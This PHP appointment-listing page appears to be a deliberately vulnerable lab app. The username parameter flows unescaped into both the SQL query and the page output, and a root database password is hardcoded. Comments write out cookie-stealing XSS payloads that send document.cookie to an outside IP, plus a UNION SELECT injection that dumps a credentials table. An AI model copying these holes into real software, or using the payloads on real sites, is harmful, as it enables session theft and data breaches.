<?php
  ini_set('display_errors', 1);
  ini_set('display_startup_errors', 1);
  error_reporting(E_ALL);
  $DATABASE_HOST = 'localhost';
  $DATABASE_USER = 'root';
  $DATABASE_PASS = 'P@ssw0rd';
  $DATABASE_NAME = 'appointments';
//XSS cookie steals
//   <script>
// location.href = `http://192.168.226.129/getCookie.php?cookie=${document.cookie}`
//
//<img src=`http://192.168.226.129/getCookie.php?cookie=${document.cookie}`>
//Reflected
//http://localhost/viewAppointments.php?username=<script>location.href = `http://192.168.226.129/getCookie.php?cookie=${document.cookie}`</script>
//<script>location.replace(`http://192.168.226.129/getCookie.php?cookie=${document.cookie}`)</script>
//<script>location.assign(`http://192.168.226.129/getCookie.php?cookie=${document.cookie}`)</script>
  if(sizeof($_GET) != 0){
    $userFilter = $_GET['username'];
  }

  $con = mysqli_connect($DATABASE_HOST, $DATABASE_USER, $DATABASE_PASS, $DATABASE_NAME);

  if(isset($userFilter) == true && empty($userFilter) == false) {
    //chris' UNION SELECT * FROM userCreds -- -
    $sql = "SELECT fullName, reason, aptDate, username FROM appointmentDetails WHERE username='$userFilter'";
  } else {
    $sql = "SELECT fullName, reason, aptDate, username FROM appointmentDetails";
  }
  $result = mysqli_query($con, $sql);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Booking Appointment</title>
    <script src="https://code.jquery.com/jquery-3.6.0.js" integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk=" crossorigin="anonymous" defer></script>
    <link rel="stylesheet" href="./css/unicorn.css">
    <style>
        body{ font: 14px sans-serif; text-align: center; }
    </style>
</head>
<body id="root">
  <img src="./images/logo.JPG">
  <?php
    if(isset($userFilter)) {
      echo "Filtering for user:" . $userFilter;
    }
    if(mysqli_num_rows($result) > 0) {
      $rowcount = 0;
      while($row = mysqli_fetch_assoc($result)) {
        echo "<div class='card container' id=row" . $rowcount . ">";
          echo "<p class='username'> Username: " . $row['username'] . "</p>";
          echo "<p> Name:" . $row['fullName'] . "</p>";
          echo "<p> Date: ". $row['aptDate'] . "</p>";
          echo "<p> Reason: ". $row['reason'] . "</p>";
        echo "</div>";
        echo "<br>";
        $rowcount+=1;
      }
    } else {
      echo "No Appointments!";
    }
    mysqli_close($con);
  ?>
</body>
</html>
